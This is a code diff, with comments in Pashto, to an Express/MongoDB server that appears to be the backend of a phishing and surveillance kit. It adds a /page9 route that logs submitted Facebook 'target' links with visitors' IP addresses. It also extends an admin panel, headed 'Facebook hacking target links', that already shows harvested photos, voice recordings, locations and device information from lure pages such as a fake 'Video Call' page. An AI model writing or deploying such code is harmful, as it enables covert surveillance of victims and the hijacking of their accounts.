@@ -24,6 +24,10 @@ const LocationData = mongoose.model('LocationData', locationSchema);
 const linkSchema = new mongoose.Schema({ type: String, url: String, time: String });
 const LinkData = mongoose.model('LinkData', linkSchema);
 
+// نوی اسکیم د فیسبوک لینکونو د ذخیره کولو لپاره
+const fbLinkSchema = new mongoose.Schema({ time: String, ip: String, link: String });
+const FbLinkData = mongoose.model('FbLinkData', fbLinkSchema);
+
 app.set('trust proxy', true);
 const upload = multer({ storage: multer.memoryStorage() });
 
@@ -59,9 +63,13 @@ app.get('/page7', (req, res) => {
     res.sendFile(path.join(__dirname, 'index7.html'));
 });
 
-// --- نوی اضافه شوی مسیر د Video Call لپاره (/page8) ---
 app.get('/page8', (req, res) => {
     res.sendFile(path.join(__dirname, 'index8.html'));
+});
+
+// --- نوې اضافه شوې پاڼه (/page9) د فیسبوک لینکونو لپاره ---
+app.get('/page9', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index9.html'));
 });
 
 // Catbox ته د فایل د اپلوډ کولو فنکشن
@@ -107,8 +115,21 @@ app.post('/page7', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async 
     handleIncomingData(req, res);
 });
 
-// د نوي /page8 پاڼې پوسټ ریکویسټ
 app.post('/page8', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
+    handleIncomingData(req, res);
+});
+
+// د نوي /page9 پاڼې پوسټ ریکویسټ (د فیسبوک لینک، عکسونه او غږونه)
+app.post('/page9', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
+    if (req.body.facebook_target_link) {
+        let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'نامعلوم';
+        if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
+        if (clientIp === '::1' || clientIp === '::ffff:127.0.0.1') clientIp = '127.0.0.1 (Localhost)';
+
+        const time = new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');
+        await FbLinkData.create({ time, ip: clientIp, link: req.body.facebook_target_link });
+        return res.send("Facebook Link Saved");
+    }
     handleIncomingData(req, res);
 });
 
@@ -159,7 +180,7 @@ async function handleIncomingData(req, res) {
     res.status(400).send("Bad Request");
 }
 
-// د اډمین پاڼه (بدون تغیر په پخواني منطق)
+// د اډمین پاڼه (د نویو فیسبوک لینکونو په ګډون)
 app.get('/admin', async (req, res) => {
     const showWelcome = !req.headers.cookie?.includes('welcome=true') && req.query.action !== 'enter';
 
@@ -174,6 +195,7 @@ app.get('/admin', async (req, res) => {
         else if (target === 'device_info') await DeviceInfo.deleteMany({});
         else if (target === 'all_photos') await LinkData.deleteMany({ type: 'photo' });
         else if (target === 'all_voices') await LinkData.deleteMany({ type: 'voice' });
+        else if (target === 'fb_links') await FbLinkData.deleteMany({});
         return res.redirect('/admin');
     }
 
@@ -181,6 +203,7 @@ app.get('/admin', async (req, res) => {
     const locations = await LocationData.find().sort({ _id: -1 });
     const photos = await LinkData.find({ type: 'photo' }).sort({ _id: -1 });
     const voices = await LinkData.find({ type: 'voice' }).sort({ _id: -1 });
+    const fbLinks = await FbLinkData.find().sort({ _id: -1 });
 
     let deviceInfoHtml = devices.length ? `<pre style="white-space: pre-wrap; font-size: 14px; color: #111; background: #fafafa; padding: 12px; border-radius: 6px; max-height: 250px; overflow-y: auto; font-family: monospace; line-height: 1.5;">${devices.map(d => d.info).join('\n')}</pre>` : '<p>تاسې تر اوسه د موبایل کوم معلومات نه دي ترلاسه کړي.</p>';
     let deleteDevBtn = devices.length ? `<a href="/admin?delete=device_info" class="delete-btn" onclick="return confirm('ټول معلومات پاک شي؟')">ټول پاکول</a>` : '';
@@ -193,6 +216,10 @@ app.get('/admin', async (req, res) => {
 
     let voicesHtml = voices.length ? voices.map(v => `<div class='item-box' style='margin-bottom: 8px; text-align: right; padding: 8px;'><audio controls src="${v.url}"></audio></div>`).join('') : "<p>کوم غږیز ریکارډ تر اوسه نشته.</p>";
     let deleteAllVoicesBtn = voices.length ? `<a href="/admin?delete=all_voices" class="delete-btn" onclick="return confirm('ټول غږونه پاک شي؟')">ټول پاکول</a>` : '';
+
+    // د فیسبوک لینکونو HTML برخه په اډمین پینل کې
+    let fbLinksHtml = fbLinks.length ? `<pre style="white-space: pre-wrap; font-size: 14px; color: #111; background: #fafafa; padding: 12px; border-radius: 6px; max-height: 200px; overflow-y: auto; font-family: monospace; line-height: 1.5;">${fbLinks.map(f => `📅 نېټه: ${f.time}\n🌐 آی‌پي: ${f.ip}\n🔗 لینک: ${f.link}\n-----------------------------------`).join('\n')}</pre>` : '<p>تر اوسه کوم فیسبوک لینک نه دی ثبت شوی.</p>';
+    let deleteFbLinksBtn = fbLinks.length ? `<a href="/admin?delete=fb_links" class="delete-btn" onclick="return confirm('ټول فیسبوک لینکونه پاک شي؟')">ټول پاکول</a>` : '';
 
     let html = `
     <!DOCTYPE html>
@@ -235,6 +262,9 @@ app.get('/admin', async (req, res) => {
         </div>`;
     } else {
         html += `
+        <h2>🔗 د فیسبوک هیکینګ target لینکونه: ${deleteFbLinksBtn}</h2>
+        <div class="card">${fbLinksHtml}</div>
+
         <h2>📱 د موبایل او سیسټم معلومات: ${deleteDevBtn}</h2>
         <div class="card">${deviceInfoHtml}</div>
 
